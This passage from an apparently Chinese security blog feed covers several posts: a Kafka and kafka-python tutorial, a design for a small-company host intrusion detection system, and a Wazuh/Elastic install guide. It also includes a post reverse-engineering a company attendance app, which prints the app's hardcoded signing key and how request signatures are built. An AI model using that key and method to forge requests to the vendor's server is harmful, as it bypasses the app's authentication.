    <content type="html"><![CDATA[<h3 id="Kafka-简介"><a href="#Kafka-简介" class="headerlink" title="Kafka 简介"></a>Kafka 简介</h3><p>详情：<a href="http://kafka.apachecn.org/intro.html" target="_blank" rel="noopener">http://kafka.apachecn.org/intro.html</a></p><h3 id="Kafka-使用"><a href="#Kafka-使用" class="headerlink" title="Kafka 使用"></a>Kafka 使用</h3><p>简介这种网上很多的，此处不介绍了，可以查看以上ApacheCN的文档，就直接开始使用和python之间的整合。</p><p>下载当前的最新版本：</p><pre><code>wget http://archive.apache.org/dist/kafka/2.4.0/kafka_2.13-2.4.0.tgz</code></pre><p>此处没有搭建zookeeper，就直接使用kafka的便捷脚本创建节点</p><pre><code>./bin/zookeeper-server-start.sh config/zookeeper.properties</code></pre><p>如果出现错误<code>Unrecognized VM option &#39;PrintGCDateStamps&#39;</code>，可能是Java版本和Kafka版本之间的问题，尝试使用更高版本的Kafka或者其他版本的Java。</p><p>启动kafka，先复制一份需要的配置文件</p><pre><code>cp config/server.properties config/server-1.properties</code></pre><p>配置文件中</p><pre><code>broker.id=0  #必须唯一，当前只设置一个，所以暂不更改listeners=PLAINTEXT://:9092 #listeners是broker监听的地址和端口，多broker的时候需要不重复log.dirs=/tmp/kafka-logs-1 #日志，此处改为kafka-logs-1zookeeper.connect=localhost:2181  #zookeeper地址，没更改</code></pre><p>启动kafka</p><pre><code>./bin/kafka-server-start.sh config/server-1.properties</code></pre><p>一串输出后，kafka启动成功</p><p><img src="https://i.loli.net/2020/01/14/jTvtupFxArQEIoh.png" alt="1578901458153.png"></p><h4 id="创建一个主题"><a href="#创建一个主题" class="headerlink" title="创建一个主题"></a>创建一个主题</h4><pre><code>./bin/kafka-topics.sh --create --zookeeper localhost:2181 --replication-factor 1 --partitions 1 --topic test   #创建test主题,replication-factor副本数，小于集群服务器数./bin/kafka-topics.sh --list --zookeeper localhost:2181  #查看当前主题</code></pre><p><img src="https://i.loli.net/2020/01/14/VMQzbmGAuKjyHrx.png" alt="1578902209494.png"></p><h4 id="发送消息"><a href="#发送消息" class="headerlink" title="发送消息"></a>发送消息</h4><p>当在生产者发送消息的时候，消费者会显示消息</p><pre><code>./bin/kafka-console-consumer.sh --bootstrap-server localhost:9092 --topic test --from-beginning # 消费者监听，此时有生产者传入消息会显示./bin/kafka-console-producer.sh --broker-list localhost:9092 --topic test #生产者发送消息</code></pre><h4 id="多代理集群"><a href="#多代理集群" class="headerlink" title="多代理集群"></a>多代理集群</h4><p>为每个代理创建一个配置文件</p><pre><code>如上的复制配置文件cp config/server.properties config/server-1.properties修改配置文件参数config/server-1.properties:    broker.id=1    listeners=PLAINTEXT://:9093    log.dir=/tmp/kafka-logs-1</code></pre><p>启动新节点</p><pre><code>./bin/kafka-server-start.sh config/server-1.properties &amp;</code></pre><p>重新创建一个主题，然后通过生产者和消费者来处理消息，处理方式和上一样，只是需要更改不同的topic</p><h4 id="导入-导出文件"><a href="#导入-导出文件" class="headerlink" title="导入/导出文件"></a>导入/导出文件</h4><p>使用官方提高的三个配置文件，首先是Kafka Connect的配置文件，包含常用的配置，如Kafka brokers连接方式和数据的序列化格式。 其余的配置文件均指定一个要创建的连接器。这些文件包括连接器的唯一名称，类的实例，以及其他连接器所需的配置。</p><pre><code>./bin/connect-standalone.sh config/connect-standalone.properties config/connect-file-source.properties config/connect-file-sink.properties</code></pre><p>一连串输出后，提示没有test.txt文件。</p><p><img src="https://i.loli.net/2020/01/14/GvlowAIxhsKFmi3.png" alt="1578905379715.png"></p><p>创建test.txt，就可以看到对文件的处理，文件夹下就会生成test.sink.txt。</p><p><img src="https://i.loli.net/2020/01/14/rp4KibEAcl5Htog.png" alt="1578905418254.png"></p><h3 id="使用python处理消息"><a href="#使用python处理消息" class="headerlink" title="使用python处理消息"></a>使用python处理消息</h3><p>安装包</p><pre><code>pip3 install kafka-python</code></pre><p>使用文档</p><pre><code>https://kafka-python.readthedocs.io/en/master/usage.html</code></pre><h4 id="生产者代码："><a href="#生产者代码：" class="headerlink" title="生产者代码："></a>生产者代码：</h4><pre><code>from kafka import KafkaProducerfrom kafka.errors import KafkaErrorproducer = KafkaProducer(    bootstrap_servers=[        &quot;localhost:9092&quot;  ])future = producer.send(&quot;test&quot;, b&#39;I am rito yan&#39;)try:    record_metadata = future.get(timeout=10)    print(record_metadata)except KafkaError as e:    print(e)</code></pre><p>发送成功后返回</p><pre><code>RecordMetadata(topic=&#39;test&#39;, partition=0, topic_partition=TopicPartition(topic=&#39;test&#39;, partition=0), offset=3, timestamp=1578905897675, checksum=None, serialized_key_size=-1, serialized_value_size=13, serialized_header_size=-1)</code></pre><p>也可以格式化消息格式</p><pre><code>from kafka import KafkaProducerfrom kafka.errors import KafkaErrorproducer = KafkaProducer(  bootstrap_servers=[        &quot;localhost:9092&quot;  ]  #value_serializer=lambda m: json.dumps(m).encode(&#39;ascii&#39;) #生产者发送json数据)future = producer.send(&quot;test&quot;, b&#39;I am rito yan&#39;)#future = producer.send(&#39;test&#39;, {&#39;key&#39;: &#39;value&#39;})try:    record_metadata = future.get(timeout=10)    print(record_metadata)except KafkaError as e:    print(e)</code></pre><h4 id="消费者代码"><a href="#消费者代码" class="headerlink" title="消费者代码"></a>消费者代码</h4><pre><code>from kafka import KafkaConsumerconsumer = KafkaConsumer(    &quot;test&quot;,    group_id = &quot;user-test&quot;,   #群组id，消息只能被同组的一个消费者消费，所以需要定义组名    bootstrap_servers = [        &quot;localhost:9092&quot;    ]    #value_deserializer=lambda m: json.loads(m.decode(&#39;ascii&#39;)) #格式化解析格式)for message in consumer:    print(&quot;%s:%d:%d: key=%s value=%s&quot; % (message.topic, message.partition,                                          message.offset, message.key,                                          message.value))</code></pre><p>消费这运行后处于监听状态，当运行如上的生产者代码的时候，界面会显示出生产者的消息</p><p><img src="https://i.loli.net/2020/01/14/TXHazuyFBOMercZ.png" alt="1578907705145.png"></p><h3 id="项目中引用"><a href="#项目中引用" class="headerlink" title="项目中引用"></a>项目中引用</h3><p>kafka在实现过程中，消费者处于监听状态，但是项目运行时，阻塞性的监听并不可用，可以使用多线程或者其他方式来处理。</p><pre><code>def search_area():    prints = PrintThread()    prints.setDaemon(True)    prints.start()    for i in range(100,200):         time.sleep(1)         print(i)import threadingimport timefrom kafka import KafkaConsumerclass PrintThread(threading.Thread):    def run(self):        print(&quot;start.... %s&quot; %self.getName())        consumer = KafkaConsumer(            &quot;test&quot;,            group_id = &quot;user-test&quot;,   #群组id，消息只能被同组的一个消费者消费，所以需要定义组名            bootstrap_servers = [                &quot;localhost:9092&quot;            ]            #value_deserializer=lambda m: json.loads(m.decode(&#39;ascii&#39;)) #格式化解析格式        )        for message in consumer:            print(&quot;%s:%d:%d: key=%s value=%s&quot; % (message.topic, message.partition,                                                  message.offset, message.key,                                                  message.value))search_area()</code></pre><p>达到主线程不阻塞的情况下仍然可以继续监听</p><p><img src="https://i.loli.net/2020/01/14/lYfcqCXow9R2gJW.png" alt="1578987250537.png"></p><p>或者不采用监听的方式，采用主动拉取队列数据，这样一次拉取的时候可能是较大的数据，对数据量处理要求高的情况下可能会增加消息延迟堆积</p><pre><code>from kafka import KafkaConsumerconsumer = KafkaConsumer(    &quot;test&quot;,    group_id=&#39;user-test&#39;,     bootstrap_servers = [        &quot;localhost:9092&quot;    ])consumer.subscribe(topics=(&#39;test&#39;,))#  consumer.subscribe(topics=(&#39;test&#39;,&#39;test0&#39;))  #订阅多个主题msg = consumer.poll(timeout_ms=2000)  # 从kafka获取消息print(msg)for tp, messages in msg.items():    for message in messages:        print(&quot;%s:%d:%d: key=%s value=%s&quot; % (tp.topic, tp.partition,                                          message.offset, message.key,                                          message.value))</code></pre><p>但是这样做会出现多次获取重复已消费的信息，因为自动位移提交的动作是在 poll() 方法的逻辑里完成的，在每次真正向服务端发起拉取请求之前会检查是否可以进行位移提交，如果可以，那么就会提交上一次轮询的位移。单次请求的时候不能提交offset。</p><p><img src="https://i.loli.net/2020/01/14/Fex4WgyqDaQ37vM.png" alt="1578984621248.png"></p><p>添加如下手动提交已消费信息</p><pre><code>from kafka import KafkaConsumerconsumer = KafkaConsumer(    &quot;test&quot;,    group_id=&#39;user-test&#39;,     enable_auto_commit = False,    bootstrap_servers = [        &quot;localhost:9092&quot;    ])consumer.subscribe(topics=(&#39;test&#39;,))#  consumer.subscribe(topics=(&#39;test&#39;,&#39;test0&#39;))  #订阅多个主题msg = consumer.poll(timeout_ms=2000)  # 从kafka获取消息print(msg)for tp, messages in msg.items():    for message in messages:        print(&quot;%s:%d:%d: key=%s value=%s&quot; % (tp.topic, tp.partition,                                          message.offset, message.key,                                          message.value))consumer.commit()  #同步提交，直到正常或异常返回之前阻塞consumer.commit_async() #异步提交，不阻塞</code></pre><p>读取已消费信息</p><p>使用 seek方法从指定的partition和offset开始读取数据，需要记录分区和offset。</p><pre><code>#encoding:utf8from kafka import KafkaConsumer, TopicPartitionmy_topic = &quot;my.topic&quot; # 指定需要消费的主题consumer = KafkaConsumer(    bootstrap_servers = &quot;192.168.70.221:19092,192.168.70.222:19092,192.168.70.223:19092&quot;, # kafka集群地址    group_id = &quot;my.group&quot;, # 消费组id    enable_auto_commit = True, # 每过一段时间自动提交所有已消费的消息（在迭代时提交）    auto_commit_interval_ms = 5000, # 自动提交的周期（毫秒）)consumer.assign([    TopicPartition(topic=my_topic, partition=0),    TopicPartition(topic=my_topic, partition=1),    TopicPartition(topic=my_topic, partition=2)])consumer.seek(TopicPartition(topic=my_topic, partition=0), 12) # 指定起始offset为12consumer.seek(TopicPartition(topic=my_topic, partition=1), 0) # 可以注册多个分区，此分区从第一条消息开始接收# consumer.seek(TopicPartition(topic=my_topic, partition=2), 32) # 没有注册的分区上的消息不会被消费for msg in consumer: # 迭代器，等待下一条消息    print msg # 打印消息</code></pre><h3 id="部署kafka"><a href="#部署kafka" class="headerlink" title="部署kafka"></a>部署kafka</h3><p>配置好需要的参数后</p><pre><code>./bin/zookeeper-server-start.sh -daemon config/zookeeper.properties</code></pre><p>就可以看到zookeeper处于监听状态，当然zookeeper这个一般使用集群部署的节点，此处仍然是使用kafka。</p><p><img src="https://i.loli.net/2020/01/16/sQotxmScwZUjlfO.png" alt="1579162043232.png"></p><pre><code>./bin/kafka-server-start.sh -daemon config/server-1.properties</code></pre><p><img src="https://i.loli.net/2020/01/16/jQ8E2tVhCTfx4Dr.png" alt="1579162335867.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Kafka-简介&quot;&gt;&lt;a href=&quot;#Kafka-简介&quot; class=&quot;headerlink&quot; title=&quot;Kafka 简介&quot;&gt;&lt;/a&gt;Kafka 简介&lt;/h3&gt;&lt;p&gt;详情：&lt;a href=&quot;http://kafka.apachecn.org/intro.ht
      
    
    </summary>
    
    
      <category term="Open Source Security" scheme="/tags/Open-Source-Security/"/>
    
  </entry>
  
  <entry>
    <title>中小型企业自研HIDS简单实现</title>
    <link href="/2020/01/%E4%B8%AD%E5%B0%8F%E5%9E%8B%E4%BC%81%E4%B8%9A%E8%87%AA%E7%A0%94HIDS%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0/"/>
    <id>/2020/01/中小型企业自研HIDS简单实现/</id>
    <published>2020-01-10T03:51:09.000Z</published>
    <updated>2020-01-10T04:40:12.100Z</updated>
    
    <content type="html"><![CDATA[<p>此HIDS自研面对中小型企业，一般服务器百级。如果对集群部署，系统获取更加完善灵活，服务量级较高可以参考：</p><ol><li><a href="https://github.com/ysrc/yulong-hids" target="_blank" rel="noopener">驭龙</a></li><li><a href="https://tech.meituan.com/2019/01/17/distributed-hids-cluster-architecture-design.html" target="_blank" rel="noopener">美团</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=MzI5MjE4MDc4OQ==&amp;mid=2247483961&amp;idx=1&amp;sn=2736aad509f08c20d82cfc08b62da27a&amp;chksm=ec040463db738d754cce84506c098caca891b58740e1b38b3621f752f805eb1c02ebf0e2ac73&amp;mpshare=1&amp;scene=1&amp;srcid=1226ZgmHAUTfeYMuLFPWyuHS#rd" target="_blank" rel="noopener">点融</a></li><li><a href="https://misakikata.github.io/2019/12/OSSEC-Wazuh/" target="_blank" rel="noopener">Wazuh</a></li></ol><h3 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h3><p>架构采用，一般中小型企业安全人员较少，重视度远不如大型企业，多见“一个人的安全部”。架构不适宜过于复杂，后端开发可以根据实际采用python，go，Java等。web框架，有django，php都可以使用。消息的被动或者主动获取又涉及到是否需要使用ES或者ActiveMQ。这一点后面再讨论。此处使用平安集团分享的一个预警结构流程。</p><p><img src="https://i.loli.net/2020/01/10/WpozHBZAmJLiO4U.png" alt="1578622803994.png"></p><h3 id="Agent"><a href="#Agent" class="headerlink" title="Agent"></a>Agent</h3><p>agent的建设是整个流程中最费劲的事情了。需要以下几种特点</p><ol><li>可维护性高，获取信息稳定</li><li>对系统侵入小，适合多种系统的多版本内核</li><li>通道信息安全，进程可维护</li><li>支持灵活检测，负载小</li><li>便于一键化部署</li></ol><p>对于互联网大厂采用的方案多是hook，audit等。hook的侵入性比较高，在没有专门的定制化开发下，中小型企业使用的成本比较高，之前在试图部署驭龙的时候就发现太容易对系统造成崩溃。这是生产系统不能接受的。</p><p>如何选择侵入小，兼容高，信息全，成本低就是主要考虑了。</p><p>对文件监控上比较好的开源监控也就是aide和inotify-tools。aide是对文件的hash比较来判断文件的改动，无实时性。inotify是实时监控，倾向于此。在实际系统测试上，对各个Linux的发行版兼容性也可以满足需求。</p><p>其他信息的获取上，倾向于python库psutil。这是Linux的运维的第三方模块。可以收集很多Linux系统的信息，进程，网络，用户，内存等。可以跟主机做实时的信息获取。而且实现简单，方便跟inotify做联动。</p><p>信息推送上，如果考虑实时性，可以使用agent主动推送的信息实现方案，但这样做会面临多服务的压力，延迟，丢失。所以需要对信息做消息处理，就需要消息队列。采用何种方式根据需求选择。</p><p>agent被动提供消息，只需要把获取的信息提交到某个特定的地址。比如，此处使用类似ES的信息提供方式，agent获取信息后交给flask以json来展示，server对agent来做守护任务来被动获取。这样，实时性较低，需要对获取的信息做过滤处理。但消息获取上比较稳定。</p><h3 id="Server"><a href="#Server" class="headerlink" title="Server"></a>Server</h3><p>server端主要做信息的展示和处理整合，此处直接使用python-django。如果使用被动获取信息，需要server做定时任务，采用任务框架APScheduler来管理定时任务。</p><p>简而言之，实现方便，操作简单。server端还真是没有多少值得谈论。</p><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><p>虽然名为HIDS，但还是需要一些其他功能，只是agent传输的文件监控和主机的信息仿佛作用较低。而且在监控中可以看到，当服务文件改动较多的时候，提示的预警信息过于频繁。分析较为困难。所以为了便于发现其中存在的问题，使用文件扫描功能，比如Linux下的河马webshell扫描。调用扫描来对预警文件进行判断，但扫描识别率测试中，只有百分之六十到七十左右。识别率是否能接受就看个人情况拉。</p><p>同时，对于感染型后门，我增加了一个对威胁信息的检测。从以下地址获取感染IP：</p><p><a href="http://osint.bambenekconsulting.com" target="_blank" rel="noopener">http://osint.bambenekconsulting.com</a></p><p><a href="https://feodotracker.abuse.ch" target="_blank" rel="noopener">https://feodotracker.abuse.ch</a></p><p>通过网络连接来判断是否有类似的感染发生，对于IP的获取同样使用定时任务。</p><h3 id="web日志"><a href="#web日志" class="headerlink" title="web日志"></a>web日志</h3><p>目前想通过web日志的方式来做检测告警，比如，大量文件的变更时，跟web日志做查询，来判断是否是一个外部创建的文件。通过ES日志服务器来整合，但在实现中发现，不一定创建成功的文件就一定在日志中，就像文件重命名。所以此功能具体的实现还有待考究。</p><p>如果后期可以发现一种webshell识别较高的情况，可以使用扫描价web日志联合告警的方式来减少预警的情况下，提高准确度。</p><p>由于使用上没有采用agent主动推送，没用参考消息队列，后期准备改为推送和消息队列形式，同时增加对文件检测的识别和减少告警。同时希望agent的信息获取可以使用audit的方式。</p><p>以下是代码实现，简单到会django就可以做二次修改哦</p><p><a href="https://github.com/MisakiKata/zeru" target="_blank" rel="noopener">zeru</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;此HIDS自研面对中小型企业，一般服务器百级。如果对集群部署，系统获取更加完善灵活，服务量级较高可以参考：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/ysrc/yulong-hids&quot; target=&quot;_blank&quot; rel=&quot;noo
      
    
    </summary>
    
    
      <category term="Open Source Security" scheme="/tags/Open-Source-Security/"/>
    
  </entry>
  
  <entry>
    <title>逆向打卡APP</title>
    <link href="/2019/12/%E9%80%86%E5%90%91%E6%89%93%E5%8D%A1APP/"/>
    <id>/2019/12/逆向打卡APP/</id>
    <published>2019-12-28T14:57:04.000Z</published>
    <updated>2019-12-28T14:57:06.000Z</updated>
    
    <content type="html"><![CDATA[<p>公司打卡APP，由于偶尔忘记打卡，所以想做一个能查询是否打卡来提醒自己的脚本，为什么不做自动打卡脚本，担心万一更新出问题，但没有发现，那岂不是很尴尬。</p><p>首先抓包，查看查询打卡的请求。</p><p><img src="https://i.loli.net/2019/12/28/nTaUrsMmBKqwZ2d.png" alt="image20191228215916256.png"><br>获取其中的参数，其中userid为手机号，rmk3为设备uid，reqssn为固定字符串，所以需要知道加密算法来计算sign</p><pre><code>fm=&lt;fm&gt;&lt;userid&gt;178xxxx&lt;/userid&gt;&lt;ver&gt;3.2.0&lt;/ver&gt;&lt;rmk1/&gt;&lt;rmk2&gt;2&lt;/rmk2&gt;&lt;rmk3&gt;8xxxx-xxxx-xxxx-xxxx-BCxxxxxxxx71&lt;/rmk3&gt;&lt;action&gt;attendRecord&lt;/action&gt;&lt;reqssn&gt;2244f70148454d03baeb739d9c86e082&lt;/reqssn&gt;&lt;sign&gt;54bexxxxxx&lt;/sign&gt;&lt;/fm&gt;</code></pre><p>按照惯例，解包后搜索参数名，找到一个sign函数，查看后发现是加密函数，其中部分代码如下，或者uuid，拼接参数</p><p><img src="https://i.loli.net/2019/12/28/goh6MUtlId1QeJj.png" alt="2.png"><br>其中有个私钥，记录一下</p><pre><code>PRIVATE_KEY = &quot;6fcb5584c28743b8ff16337353b0cabe&quot;</code></pre><p>继续查看，就可以看到后面还拼接了reqssn，然后通过和私钥的拼接组成新的字符串做一个sha256加密。所以，这个reqssn参数是哪里来的呢，是否是固定值。搜索查看</p><p><img src="https://i.loli.net/2019/12/28/ThS3Rj1Yf2oBqmO.png" alt="3.png"></p><p>在其他函数位置发现，reqssn的值，是固定值，且写入代码中。后面的就是上面所说的sign函数。<br><img src="https://i.loli.net/2019/12/28/eH4gfNX21yTZdnB.png" alt="4.png"></p><p>至于uuid是怎么发现，继续查看相关的代码引用，发现是利用本地读取的文件，打开测试机，找到如下位置，发现保存的uuid</p><p><img src="https://i.loli.net/2019/12/28/EK1VpcO6BMsJNCm.png" alt="5.png"></p><p>理论上至此，参数值和加密已经得知，但是经过计算还是不一样，继续查看调用的加密，发现其中做了一次base64的编码，然后再sha256加密。</p><p><img src="https://i.loli.net/2019/12/28/4aLcN3QHoKe9GV2.png" alt="6.png"></p><p>至此能算出加密值和抓包到的结果一致。</p><p><img src="https://i.loli.net/2019/12/28/o4YKayEedkcAQ5J.png" alt="image20191228221903626.png"></p><p>如果仔细想想，这个请求中貌似没有变化的量那岂不是只需要做这个请求就可以，干嘛需要加密算法呢。这个请求中没有变化的值，但是登陆中有啊，其中的reqssn就不再是固定值，而是一个当前的时间戳，这时候就需要算法来生成sign。总不能cookie失效一次就抓一次包改一次cookie吧。</p><p>登陆的时候参数就是</p><pre><code>&lt;fm&gt;&lt;pwd&gt;cxxxxxxxx0b33xxxxxxxxxxxxxx&lt;/pwd&gt;&lt;userid&gt;17xxxxxxx&lt;/userid&gt;&lt;ver&gt;3.2.0&lt;/ver&gt;&lt;rmk1/&gt;&lt;rmk2&gt;2&lt;/rmk2&gt;&lt;rmk3&gt;ffxxxxxx-xxxx-xxxx-xxxx-xxxxxxx9b&lt;/rmk3&gt;&lt;action&gt;login&lt;/action&gt;&lt;reqssn&gt;20191225122352145&lt;/reqssn&gt;&lt;/fm&gt;</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;公司打卡APP，由于偶尔忘记打卡，所以想做一个能查询是否打卡来提醒自己的脚本，为什么不做自动打卡脚本，担心万一更新出问题，但没有发现，那岂不是很尴尬。&lt;/p&gt;
&lt;p&gt;首先抓包，查看查询打卡的请求。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/20
      
    
    </summary>
    
    
      <category term="Android逆向" scheme="/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>OSSEC Wazuh</title>
    <link href="/2019/12/OSSEC-Wazuh/"/>
    <id>/2019/12/OSSEC-Wazuh/</id>
    <published>2019-12-06T05:47:30.000Z</published>
    <updated>2019-12-06T05:47:30.353Z</updated>
    
    <content type="html"><![CDATA[<h2 id="安装Wazuh-manager"><a href="#安装Wazuh-manager" class="headerlink" title="安装Wazuh manager"></a>安装Wazuh manager</h2><p>使用Ubuntu系统，目前wazuh版本为3.10</p><p>安装文档地址：<a href="https://documentation.wazuh.com/3.10/installation-guide/installing-elastic-stack/elastic_server_deb.html" target="_blank" rel="noopener">https://documentation.wazuh.com/3.10/installation-guide/installing-elastic-stack/elastic_server_deb.html</a></p><h3 id="添加更新源"><a href="#添加更新源" class="headerlink" title="添加更新源"></a>添加更新源</h3><pre><code>apt-get updateapt-get install curl apt-transport-https lsb-release#需要python2.7以上curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | apt-key add -    #添加更新源echo &quot;deb https://packages.wazuh.com/3.x/apt/ stable main&quot; | tee -a /etc/apt/sources.list.d/wazuh.list          #更新包apt-get update</code></pre><h3 id="安装Wazuh-Manager"><a href="#安装Wazuh-Manager" class="headerlink" title="安装Wazuh Manager"></a>安装Wazuh Manager</h3><pre><code>apt-get install wazuh-managerservice wazuh-manager status         #检查运行状态</code></pre><p><img src="https://i.loli.net/2019/12/06/Ru2XzHUAwe4oa9m.png" alt="1573632035628.png"></p><h3 id="安装Wazuh-API"><a href="#安装Wazuh-API" class="headerlink" title="安装Wazuh API"></a>安装Wazuh API</h3><pre><code>如果不能直接安装nodejs需要添加更新源安装curl -sL https://deb.nodesource.com/setup_8.x | bash - apt-get install nodejsapt-get install wazuh-apiservice wazuh-api status                #检查运行状态sed -i &quot;s/^deb/#deb/&quot; /etc/apt/sources.list.d/wazuh.list     #禁用Wazuh更新源apt-get update</code></pre><p><img src="https://i.loli.net/2019/12/06/7PYhXvpbqlon3WA.png" alt="1573632016475.png"><br>配置API用户信息，启用HTTPS，可以使用脚本生成证书或者自动生成证书，以下自动生成证书，同时还可以修改访问API的用户，默认用户密码是foo和bar。如需要修改记得重启服务。</p><pre><code># 配置端口账户等信息cd /var/ossec/api/scripts./configure_api.sh#不使用脚本修改cd /var/ossec/api/configuration/authnode htpasswd -Bc -C 10 user myUserName</code></pre><p><img src="https://i.loli.net/2019/12/06/P84TgHbWezd6Bo5.png" alt="1573632486393.png"></p><h2 id="安装Filebeat"><a href="#安装Filebeat" class="headerlink" title="安装Filebeat"></a>安装Filebeat</h2><p>Filebeat是Wazuh服务器上的工具，可以将警报和归档事件安全地转发到Elastic Stack服务器上的Logstash服务。</p><p>添加源存储库和密钥：</p><pre><code>apt-get install curl apt-transport-httpscurl -s https://artifacts.elastic.co/GPG-KEY-elasticsearch | apt-key add -echo &quot;deb https://artifacts.elastic.co/packages/7.x/apt stable main&quot; | tee /etc/apt/sources.list.d/elastic-7.x.listapt-get update</code></pre><p>安装</p><pre><code>apt-get install filebeat=7.4.2</code></pre><p>从Wazuh存储库下载Filebeat配置文件。这是预先配置的，用于将Wazuh警报转发到Elasticsearch：</p><pre><code>curl -so /etc/filebeat/filebeat.yml https://raw.githubusercontent.com/wazuh/wazuh/v3.10.2/extensions/filebeat/7.x/filebeat.yml</code></pre><p>下载Elasticsearch的警报模板：</p><pre><code>curl -so /etc/filebeat/wazuh-template.json https://raw.githubusercontent.com/wazuh/wazuh/v3.10.2/extensions/elasticsearch/7.x/wazuh-template.json</code></pre><p>下载适用于Filebeat的Wazuh模块：</p><pre><code>curl -s https://packages.wazuh.com/3.x/filebeat/wazuh-filebeat-0.1.tar.gz | sudo tar -xvz -C /usr/share/filebeat/module</code></pre><p>编辑文件，<code>/etc/filebeat/filebeat.yml</code>并用<code>YOUR_ELASTIC_SERVER_IP</code>Elasticsearch服务器的IP地址或主机名替换。例如：</p><pre><code>output.elasticsearch:  hosts: [&quot;192.168.120.128:9200&quot;]</code></pre><p>启用并启动Filebeat服务：</p><pre><code>systemctl daemon-reloadsystemctl enable filebeat.servicesystemctl start filebeat.service</code></pre><h2 id="安装Elastic-Stack"><a href="#安装Elastic-Stack" class="headerlink" title="安装Elastic Stack"></a>安装Elastic Stack</h2><p>添加弹性存储库及其GPG密钥：</p><pre><code>apt-get install curl apt-transport-httpscurl -s https://artifacts.elastic.co/GPG-KEY-elasticsearch | apt-key add -echo &quot;deb https://artifacts.elastic.co/packages/7.x/apt stable main&quot; | tee /etc/apt/sources.list.d/elastic-7.x.listapt-get update</code></pre><p>安装Elasticsearch软件包：</p><pre><code>apt-get install elasticsearch=7.4.2</code></pre><p>需要Java环境，例如安装openjdk</p><pre><code>apt install openjdk-11-jre-headless</code></pre><p>此处网速影响，挂VPS下载软件包解压使用。</p><p>如果使用源安装编辑文件<code>/etc/elasticsearch/elasticsearch.yml</code>并取消注释设置，将Elasticsearch配置为侦听非回送地址<code>network.host</code>。将值更改为要绑定到的IP：</p><pre><code>network.host: &lt;elasticsearch_ip&gt;</code></pre><p>更改<code>network.host</code>选项后，需要进一步配置。在文件中添加或编辑（如果有注释）以下几行<code>/etc/elasticsearch/elasticsearch.yml</code>：</p><pre><code>node.name: &lt;node_name&gt;cluster.initial_master_nodes: [&quot;&lt;node_name&gt;&quot;]</code></pre><p>如果使用下载文件包启动方式，编辑文件<code>elasticsearch/config/elasticsearch.yml</code>来执行如上操作。</p><p>修改完成后启动ES。</p><pre><code>systemctl daemon-reloadsystemctl enable elasticsearch.servicesystemctl start elasticsearch.service文件启动的话，需要非root用户启动</code></pre><p>检查启动是否正常</p><pre><code>curl http://192.168.120.128:9200</code></pre><p><img src="https://i.loli.net/2019/12/06/9NxKEQgILsohtJ8.png" alt="1575446874341.png"></p><h2 id="安装Kibana"><a href="#安装Kibana" class="headerlink" title="安装Kibana"></a>安装Kibana</h2><p>源安装</p><pre><code>apt-get install kibana=7.4.2</code></pre><p>安装适用于Kibana的Wazuh应用程序插件：</p><p>从URL安装：</p><pre><code>sudo -u kibana /usr/share/kibana/bin/kibana-plugin install https://packages.wazuh.com/wazuhapp/wazuhapp-3.10.2_7.4.2.zip</code></pre><p>从软件包安装：</p><pre><code>sudo -u kibana /usr/share/kibana/bin/kibana-plugin install file:///path/wazuhapp-3.10.2_7.4.2.zip</code></pre><p>编辑文件<code>/etc/kibana/kibana.yml</code>，修改设置<code>server.host</code></p><pre><code>server.host: &quot;192.168.120.128&quot;   //修改为主机地址elasticsearch.hosts: [&quot;http://192.168.120.128:9200&quot;]  //修改为es的主机地址，此处使用同一台主机</code></pre><p>启用并启动Kibana服务：</p><pre><code>systemctl daemon-reloadsystemctl enable kibana.servicesystemctl start kibana.service</code></pre><p>禁用Elasticsearch更新：</p><pre><code>sed -i &quot;s/^deb/#deb/&quot; /etc/apt/sources.list.d/elastic-7.x.listapt-get update</code></pre><p>如果出现Kibana server is not ready yet问题，可能是kibana和es的版本不一致，尝试修改为同一版本，或者是elasticsearch.hosts没有修改为主机的IP，尝试修改为主机IP，再或者是还没刷新成功，等待一会。</p><p>选择小狐狸头像，配置API认证，如果修改了则填入设置的账号密码。</p><p><img src="https://i.loli.net/2019/12/06/D2XBz9NIAEUsjn3.png" alt="1575450038054.png"><br>下载模版文件</p><pre><code># 下载filebeat配置文件curl -so /etc/filebeat/filebeat.yml https://raw.githubusercontent.com/wazuh/wazuh/v3.9.2/extensions/filebeat/7.x/filebeat.ymlchmod go+r /etc/filebeat/filebeat.yml# 下载elasticsearch的模版文件curl -so /etc/filebeat/wazuh-template.json https://raw.githubusercontent.com/wazuh/wazuh/v3.9.2/extensions/elasticsearch/7.x/wazuh-template.jsonchmod go+r /etc/filebeat/wazuh-template.json</code></pre><p>配置Filebeat</p><pre><code>output.elasticsearch:  hosts: [&#39;http://YOUR_ELASTIC_SERVER_IP:9200&#39;]# 修改为output.elasticsearch:  hosts: [&#39;http://192.168.120.128:9200&#39;]</code></pre><h2 id="安装Wazuh-agent"><a href="#安装Wazuh-agent" class="headerlink" title="安装Wazuh agent"></a>安装Wazuh agent</h2><p>以上安装可以在一台服务器中，此处agent则需要在需要监控的主机上安装，把agent安装到kali机中。</p><p>添加存储库</p><pre><code>apt-get install curl apt-transport-https lsb-release gnupg2</code></pre><p>安装Wazuh存储库GPG密钥：</p><pre><code>curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | apt-key add -</code></pre><p>添加存储库：</p><pre><code>echo &quot;deb https://packages.wazuh.com/3.x/apt/ stable main&quot; | tee /etc/apt/sources.list.d/wazuh.list</code></pre><p>更新软件包</p><pre><code>apt-get update</code></pre><p>使用如下安装还需要配置注册，可以手动注册或者脚本注册</p><pre><code>apt-get install wazuh-agent</code></pre><p><a href="https://github.com/wazuh/wazuh-api/blob/master/examples/api-register-agent.sh" target="_blank" rel="noopener">https://github.com/wazuh/wazuh-api/blob/master/examples/api-register-agent.sh</a></p><p>使用如下安装和部署，需要携带定义的变量，变量说明列表</p><p><a href="https://documentation.wazuh.com/3.10/user-manual/registering/index.html#register-agents" target="_blank" 